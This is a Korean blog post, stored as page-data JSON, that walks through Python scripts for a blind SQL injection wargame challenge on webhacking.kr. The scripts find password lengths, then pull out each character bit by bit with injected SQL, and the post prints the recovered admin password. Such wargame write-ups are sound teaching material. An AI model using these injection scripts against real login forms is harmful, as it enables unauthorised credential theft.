{"componentChunkName":"component---src-templates-blog-post-js","path":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-2편/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"시작 하기에 앞서 이전 포스트 1편 을 보고 와주시면 감사하겠습니다. 이전 포스트에서 알아낸 ID을 가지고 password의 길이에 대해 알아내는 스크립트를 작성해봅니다/ 위와 같이 간단하게 스크립트를 작성해봅니다. 결과값으로 아래와 같이 나오는데 이 정보를 가지고 다시 작성해봅니다. 일단 admin의 pw의 길이가 36자리인데 이때 ascii를 통하여 …","html":"<p>시작 하기에 앞서 <a href=\"/python/Python-requests%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-blind-injecthion-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%EC%A0%9C%EC%9E%91-1%ED%8E%B8/\">이전 포스트 1편</a> 을 보고 와주시면 감사하겠습니다.</p>\n<p>이전 포스트에서 알아낸 ID을 가지고 password의 길이에 대해 알아내는 스크립트를 작성해봅니다/</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;https://webhacking.kr/challenge/bonus-1/index.php&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#url 주소를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cookies </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;PHPSESSID&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;사용자의 쿠기 값 입력&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\">#세션 쿠키를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk7 mtki\">id</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    pw_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">while</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        pw_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">pw_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or char_length(pw) = </span><span class=\"mtk7\">{}</span><span class=\"mtk6\">  and id=&#39;</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&#39; -- &#39;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(pw_len,</span><span class=\"mtk8\">id</span><span class=\"mtk1\">) </span><span class=\"mtk5 mtki\">#반복하면서 pw의 글자수를 비교하는 Payload 코드 작성</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: value, </span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;test&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\"># pw에 Payload 코드 삽입 pw는 아무 문자나 보낸다.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,</span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies) </span><span class=\"mtk5 mtki\">#GET을 통해 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.status_code) </span><span class=\"mtk5 mtki\"># 응답 코드 확인 200번아니면 오류 상태</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(value) </span><span class=\"mtk5 mtki\"># 전달되는 Payload 코드 확인</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text: </span><span class=\"mtk5 mtki\">#응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> pw_len </span><span class=\"mtk5 mtki\">#pw 길이 반환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">__name__</span><span class=\"mtk1\"> </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;__main__&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    admin_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;admin&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    guest_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;guest&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;admin의 pw 길이 : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(admin_len)</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">guest의 pw 길이 : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(guest_len))</span></span></span></code></pre>\n<p>위와 같이 간단하게 스크립트를 작성해봅니다.</p>\n<p>결과값으로 아래와 같이 나오는데 이 정보를 가지고 다시 작성해봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">admin의 pw 길이 : 36</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">guest의 pw 길이 : 5</span></span></code></pre>\n<p>일단 admin의 pw의 길이가 36자리인데 이때 ascii를 통하여 비교를 하게 되면 최대 36*94의 횟수를 질의해서 찾아야 하기 때문에 ascii는 7bit+ 패리티 비트 1bit 해서 총 8bit로 이루어져 있다는 사실을 이용하여 8번의 질의만으로 한단어를 파악할 수 잇도록 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;https://webhacking.kr/challenge/bonus-1/index.php&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#url 주소를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cookies </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;PHPSESSID&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;사용자의 쿠기 값 입력&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\">#세션 쿠키를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk7 mtki\">id</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    pw_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">while</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        pw_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">pw_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or char_length(pw) = </span><span class=\"mtk7\">{}</span><span class=\"mtk6\">  and id=&#39;</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&#39; -- &#39;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(pw_len,</span><span class=\"mtk8\">id</span><span class=\"mtk1\">) </span><span class=\"mtk5 mtki\">#반복하면서 pw의 글자수를 비교하는 Payload 코드 작성</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: value, </span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;test&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\"># pw에 Payload 코드 삽입 pw는 아무 문자나 보낸다.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,</span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies) </span><span class=\"mtk5 mtki\">#GET을 통해 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.status_code) </span><span class=\"mtk5 mtki\"># 응답 코드 확인 200번아니면 오류 상태</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(value) </span><span class=\"mtk5 mtki\"># 전달되는 Payload 코드 확인</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text: </span><span class=\"mtk5 mtki\">#응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> pw_len </span><span class=\"mtk5 mtki\">#pw 길이 반환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_str</span><span class=\"mtk1\">(</span><span class=\"mtk7 mtki\">id</span><span class=\"mtk1\">, </span><span class=\"mtk7 mtki\">pw_len</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    pw_str </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> </span><span class=\"mtk8\">len</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,pw_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        bincar</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#임시 binery 저장장소</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> bit_index </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">9</span><span class=\"mtk1\">): </span><span class=\"mtk5 mtki\"># 8bit 체크를 위한 반복</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or id=&#39;</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&#39; and substr(lpad(bin(ascii(substr(pw,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,1))),8,0 ),</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,1) = 1 -- &#39; &quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk8\">id</span><span class=\"mtk1\">,</span><span class=\"mtk8\">len</span><span class=\"mtk1\">,bit_index)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk5 mtki\"># pw를 len으로 substr한 후 ascii코드로 변환후 2진법으로 변환 그리고 lpad를 이용해서 8bit 채워줌. bit_index를 통해 bit 하나씩 체크</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">id</span><span class=\"mtk1\"> ,</span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: value} </span><span class=\"mtk5 mtki\"># id는 매계변수로 넘어온 ID 전달, pw는 Payload 코드 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">url</span><span class=\"mtk8\">=</span><span class=\"mtk1\">url, </span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies) </span><span class=\"mtk5 mtki\"># GET를 통해 요청</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                bincar </span><span class=\"mtk8\">+=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;1&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#참인 결과일때에는 1을 추가</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">else</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                bincar </span><span class=\"mtk8\">+=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;0&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#거짓인 결과일때에는 0을 추가</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;중간비트값:&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> bincar) </span><span class=\"mtk5 mtki\">#중간 문자 bit 결과 표시</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        pw_str</span><span class=\"mtk8\">+=chr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">int</span><span class=\"mtk1\">(bincar, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) </span><span class=\"mtk5 mtki\"># 2진법에서 정수형으로 바꾼다음 char형으로 변환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;현재 패스워드&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> pw_str) </span><span class=\"mtk5 mtki\"># 중간 패스워드 상황 표시</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> pw_str </span><span class=\"mtk5 mtki\"># PW 반환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">__name__</span><span class=\"mtk1\"> </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;__main__&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    admin_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;admin&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    guest_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_pw_len</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;guest&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;admin_pw : &quot;</span><span class=\"mtk8\">+</span><span class=\"mtk3\">find_pw_str</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">id</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;admin&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk4 mtki\">pw_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">admin_len)</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">guest_pw : &quot;</span><span class=\"mtk8\">+</span><span class=\"mtk3\">find_pw_str</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">id</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;guest&quot;</span><span class=\"mtk1\">,</span><span class=\"mtk4 mtki\">pw_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">guest_len))</span></span></span></code></pre>\n<p>결과값</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">admin_pw : there_is_no_rest_for_the_white_angel</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">guest_pw : guest</span></span></code></pre>\n<p>상당한 시간이 소요 된다는 것을 볼수가 있는데 만약 ASCII 코드로 해서 33~127까지 하나씩 증가 하여 스크립트를 제작하였다면 더 많은 시간이 소요 될 수 있습니다.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"","frontmatter":{"date":"2019년 10월 23일","title":"Python requests를 이용한 blind injecthion 스크립트 제작 (2편)","tags":["Python","requests","blind injection","sqi","파이썬 스크립트","blind injection script"]}}},"pageContext":{"slug":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-2편/","previous":{"fields":{"slug":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-1편/"},"frontmatter":{"title":"Python requests를 이용한 blind injecthion 스크립트 제작 (1편)"}},"next":{"fields":{"slug":"/Python/Python-urllib-BeautifulSoup를-이용한-다음-날씨-크롤링/"},"frontmatter":{"title":"Python urllib, BeautifulSoup를 이용한 다음 날씨 크롤링!"}}}},"staticQueryHashes":["1081905842","63159454"]}